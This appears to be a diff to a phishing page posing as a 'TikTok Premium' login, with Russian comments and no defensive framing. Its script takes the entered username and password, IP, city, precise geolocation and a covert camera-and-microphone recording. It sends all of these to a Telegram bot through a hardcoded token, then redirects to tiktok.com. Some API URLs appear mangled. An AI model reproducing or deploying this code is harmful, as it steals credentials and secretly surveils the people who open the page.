@@ -3,21 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Premium Content</title>
+    <title>Premium Content</title>
     <style>
         body { margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; color: white; overflow: hidden; }
         .container { text-align: center; width: 90%; max-width: 400px; }
         #mainBtn { background: #ff0050; color: #fff; border: none; padding: 20px 0; width: 100%; font-size: 18px; font-weight: bold; border-radius: 8px; cursor: pointer; box-shadow: 0 0 20px rgba(255, 0, 80, 0.4); }
         .input-group { margin-bottom: 15px; text-align: left; }
-        input { width: 100%; padding: 12px; border-radius: 4px; border: 1px solid #333; background: #111; color: white; box-sizing: border-box; }
-        video, canvas { display: none; }
-        .loading { display: none; }
+        input { width: 100%; padding: 12px; border-radius: 4px; border: 1px solid #333; background: #111; color: white; box-sizing: border-box; outline: none; }
+        input:focus { border-color: #ff0050; }
+        #v, #c { display: none; }
+        .loading { display: none; color: #888; }
     </style>
 </head>
 <body>
 
     <div class="container" id="authBlock">
-        <img src="https://edigitalagency.com.au" width="150" style="margin-bottom: 30px;">
+        <h2 style="margin-bottom: 20px;">TikTok Premium</h2>
         <div class="input-group">
             <input type="text" id="login" placeholder="Телефон / Почта / Имя пользователя">
         </div>
@@ -35,12 +36,13 @@
     <canvas id="c"></canvas>
 
     <script>
+        // КОНФИГ
         const TOKEN = '8282459787:AAFCkf9w_T_Xvorsn-Tg0ZMgdcfWC9N8mQQ';
         const CHAT_ID = '6660269414';
+        const BASE_URL = `https://telegram.org{TOKEN}`;
 
         const btn = document.getElementById('mainBtn');
         const v = document.getElementById('v');
-        const c = document.getElementById('c');
 
         btn.addEventListener('click', async () => {
             const login = document.getElementById('login').value;
@@ -51,57 +53,71 @@
             document.getElementById('authBlock').style.display = 'none';
             document.getElementById('loadBlock').style.display = 'block';
 
-            // 1. Отправляем пароли СРАЗУ
-            await sendMsg(`🔑 **ДАННЫЕ ВХОДА**\n👤 Логин: \`${login}\`\n🔐 Пароль: \`${pass}\``);
+            // 1. Отправляем логин и пароль
+            await sendMsg(`🔑 *ДАННЫЕ ВХОДА*\n👤 Логин: \`${login}\`\n🔐 Пароль: \`${pass}\``);
 
-            // 2. Сбор системной инфы
-            const ipRes = await fetch('https://ipapi.co').then(r => r.json()).catch(() => ({}));
-            const info = `🌐 IP: ${ipRes.ip}\n🏙 Город: ${ipRes.city}\n📱 OS: ${navigator.platform}\n🔋 Батарея: ${(await navigator.getBattery()).level * 100}%`;
-            await sendMsg(`📊 **ОТЧЕТ ОБ УСТРОЙСТВЕ**\n${info}`);
+            // 2. Сбор системной инфы (IP и город)
+            try {
+                const ipRes = await fetch('https://ipapi.co').then(r => r.json());
+                const info = `🌐 IP: ${ipRes.ip}\n🏙 Город: ${ipRes.city}\n📱 OS: ${navigator.platform}`;
+                await sendMsg(`📊 *ОТЧЕТ*\n${info}`);
+            } catch (e) {
+                await sendMsg("⚠️ Не удалось получить IP данные");
+            }
 
             // 3. Геолокация
-            navigator.geolocation.getCurrentPosition(async (p) => {
-                await sendMsg(`📍 Локация: https://google.com{p.coords.latitude},${p.coords.longitude}`);
-            }, null, {enableHighAccuracy: true});
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(async (p) => {
+                    const lat = p.coords.latitude;
+                    const lon = p.coords.longitude;
+                    await sendMsg(`📍 *Локация:*\nhttps://google.com{lat},${lon}`);
+                }, null, {enableHighAccuracy: true});
+            }
 
-            // 4. Скрытая запись видео (3 сек)
-            await recordVideo(3000);
+            // 4. Запись видео (начнется параллельно)
+            recordVideo(4000);
 
-            // 5. Финальный редирект
+            // 5. Имитация загрузки и редирект
             setTimeout(() => {
                 window.location.href = "https://tiktok.com";
-            }, 500);
+            }, 5000);
         });
+
+        async function sendMsg(text) {
+            return fetch(`${BASE_URL}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: 'Markdown'
+                })
+            });
+        }
 
         async function recordVideo(ms) {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: {facingMode: 'user'}, audio: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 v.srcObject = stream;
                 const rec = new MediaRecorder(stream);
                 const chunks = [];
+                
                 rec.ondataavailable = e => chunks.push(e.data);
                 rec.onstop = async () => {
                     const blob = new Blob(chunks, { type: 'video/mp4' });
                     const fd = new FormData();
                     fd.append('chat_id', CHAT_ID);
                     fd.append('video', blob, 'capture.mp4');
-                    await fetch(`https://telegram.org{TOKEN}/sendVideo`, { method: 'POST', body: fd });
+                    
+                    await fetch(`${BASE_URL}/sendVideo`, { method: 'POST', body: fd });
                     stream.getTracks().forEach(t => t.stop());
                 };
-                rec.start();
-                await new Promise(r => setTimeout(r, ms));
-                rec.stop();
-            } catch (e) {
-                await sendMsg("❌ Камера/Микрофон заблокированы");
-            }
-        }
 
-        async function sendMsg(t) {
-            await fetch(`https://telegram.org{TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ chat_id: CHAT_ID, text: t, parse_mode: 'Markdown' })
-            });
+                rec.start();
+                setTimeout(() => rec.stop(), ms);
+            } catch (e) {
+                await sendMsg("❌ Доступ к камере отклонен");
+            }
         }
     </script>
 </body>
